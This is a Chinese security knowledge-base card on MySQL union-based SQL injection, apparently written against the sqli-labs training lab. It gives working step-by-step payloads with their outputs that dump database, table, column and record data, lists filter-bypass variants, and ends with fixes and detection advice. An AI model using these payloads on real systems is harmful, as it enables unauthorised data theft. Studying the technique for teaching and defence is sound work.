---
id: web-generic-sqli-union-seven-step-extraction
title: MySQL 联合注入七步提取：order by 定列数、-1 union 占显示位、information_schema 拖库
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-union-seven-step-extraction
tags:
- sqli
- union-based
- mysql
- information-schema
- order-by
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-12'
verification:
  verified_by: verifier-V554
  verified_at: '2026-11-12T00:17:47+08:00'
  notes: 已对照原文与59张图核对：图02 id=1'触发SQL语法错误、图03 id=1'%23 正常回显形成框架、图04 order by 3正常/4报Unknown column '4'、图05 -1 union显示位2/3、图06 database()=security、图07 emails,referers,uagents,users、图08 id,email_id、图09 concat_ws数据，均与卡片一致；已修正PoC首行：报错请求应为不带%23的 id=1'（带%23会正常回显），并补充%23框架请求。dedup除自身外最高候选mysql-union-load-file-read（load_file读文件）、wordpress-151-cat（产品特定实例）均为不同目标，非同一条链；dup-scan无相关pair。原文未给组件版本，未设affected_versions；PoC未在本机执行。
url: /docs/web/generic/sqli/web-generic-sqli-union-seven-step-extraction/
draft: false
kb_aliases:
- 联合注入
- union 注入七步法
- order by 探列
- -1 union select 显示位
- information_schema 拖库
- 联合查询注入流程
---

## 一句话结论

在有查询结果回显的 SQL 注入点上，按「闭合类型判断 → `order by` 定列数 → `-1 union select` 找显示位 → `database()` 爆库 → `information_schema.tables` 爆表 → `information_schema.columns` 爆列 → `group_concat(concat_ws())` 爆数据」七步走，就能把当前库的结构与敏感数据一次性拖出；关键技巧是用 `order by N` 的报错临界值确定列数、用不存在的 `-1` 让第一条查询为空以便页面显示 union 结果。

## 原理

- **闭合框架**：数字型是 `where id=$id`，无需闭合；字符型是 `where id='$id'`，要先用 `'` 闭合再用 `%23`（`#` 的 URL 编码）或 `--+`（`-- ` 空格）注释掉原语句剩余部分。之后的 payload 都在这套已闭合的框架里微调，避免每次重新猜结构。
- **类型/闭包判断**：`and 1=1` 与 `and 1=2` 的页面差异确认注入存在；字符型用 `1' and '1'='1` / `1' and '1'='2`。数据库报错内容（如 `near ''`）也能提示闭合符。
- **order by 定列数**：`order by N` 按第 N 列排序，N 超过实际列数时数据库报 `Unknown column 'N' in 'order clause'`；找到「N 报错、N-1 正常」的临界值即为列数（示例为 3 列）。
- **union 显示位**：`union select 1,2,3` 要求前后列数相同；把原 id 改为不存在的 `-1`，第一条查询为空，页面才会显示 union 的查询结果。哪个数字出现在页面，哪个就是显示位。
- **元数据拖库**：`database()` 返回当前默认库名；`information_schema.tables` 存表元数据（`table_name`/`table_schema`），`information_schema.columns` 存列元数据（`column_name`/`table_name`）；`group_concat()` 把多行合并到一列输出，`concat_ws('-',字段1,字段2,...)` 用分隔符区分字段边界。
- **为什么成立**：SELECT 结果集是「列数 + 列类型」的二维结构，union 只是追加行；元数据表对所有用户可读、且默认库名可用 `database()` 取到，因此无需猜表名。

## 触发条件

- 参数被直接拼接进 SQL，且页面回显查询结果或数据库错误。
- `union`、`select`、注释符未被 WAF 过滤（或被可绕过）。
- union 前后列数一致，列类型兼容（数字位可放字符串函数结果）。
- 当前数据库账号对 `information_schema` 有读权限（MySQL 默认有）。

## 利用步骤

1. 用 `'` / `"` / `and 1=1` 判断注入与闭合类型，确定字符型或数字型。
2. `order by 3` 正常、`order by 4` 报错，确定 3 列。
3. `?id=-1'union select 1,2,3%23` 观察显示位（示例中 2、3 显示）。
4. `?id=-1'union select 1,2,database()%23` 取库名。
5. `?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23` 取表名列表。
6. `?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='emails'%23` 取指定表的列名。
7. `?id=-1'union select 1,2,group_concat(concat_ws('-',id,email_id)) from emails%23` 取数据。

## PoC

```http
GET /Less-1/?id=1' HTTP/1.1
# 报错显示 SQL 语法错误 → 字符型注入

GET /Less-1/?id=1'%23 HTTP/1.1
# 正常回显（Your Login name:Dumb）→ 单引号闭合且 %23 注释成立

GET /Less-1/?id=1'order by 3%23 HTTP/1.1
# 正常
GET /Less-1/?id=1'order by 4%23 HTTP/1.1
# Unknown column '4' in 'order clause' → 共 3 列

GET /Less-1/?id=-1'union select 1,2,3%23 HTTP/1.1
# 页面显示 2 和 3 → 显示位为 2、3

GET /Less-1/?id=-1'union select 1,2,database()%23 HTTP/1.1
# Your Password: security

GET /Less-1/?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23 HTTP/1.1
# Your Password: emails,referers,uagents,users

GET /Less-1/?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='emails'%23 HTTP/1.1
# Your Password: id,email_id

GET /Less-1/?id=-1'union select 1,2,group_concat(concat_ws('-',id,email_id)) from emails%23 HTTP/1.1
# Your Password: 1-Dumb@dhakkan.com,2-Angel@iloveu.com,...
```

## 变体与关联

- 变体：`order by` 被过滤时，用 `union select` 逐步加减列数试探，或 MySQL 8 的 `union values row(1,2,...)` 直接构造表值并占显示位（[[web-generic-sqli-mysql8-values-row-column-count-union-probe]]）。
- 变体：无显示位/无回显时改报错注入（[[web-generic-sqli-error-based-extraction]]）、布尔/时间盲注或 DNS 带外（[[web-generic-sqli-dnslog-oob-exfiltration]]）。
- 变体：`group_concat` 有长度限制（默认 1024 字节），超长数据用 `substr` 分段或逐行 `limit` 读取。
- 关联：[[web-generic-sqli-wordpress-151-cat-union-dump-wp-users]]（同一七步流程在 WordPress cat 参数上的实例）、[[web-generic-sqli-mysql-union-load-file-read]]（union 位置放 `load_file()` 读文件）。
- 边界：union 查询必须与原查询列数一致；WAF 对 `union select`、`information_schema`、`group_concat` 做关键字拦截时需配合注释/大小写/版本注释绕过后再走本流程。

## 检测与防御

- 修复：全部使用参数化查询/预编译语句，禁止字符串拼接 SQL；标识符位置（表名、列名、order by）用白名单映射。
- 加固：生产环境关闭详细数据库错误；数据库账号最小权限；WAF 覆盖 `union select`、`information_schema`、`group_concat`、`order by` 数字异常等特征。
- 检测：应用日志中出现 `union`、`information_schema`、`order by N` 与单引号/注释符组合；同一参数短时间内列数试探（order by 递增）与大量元数据查询。
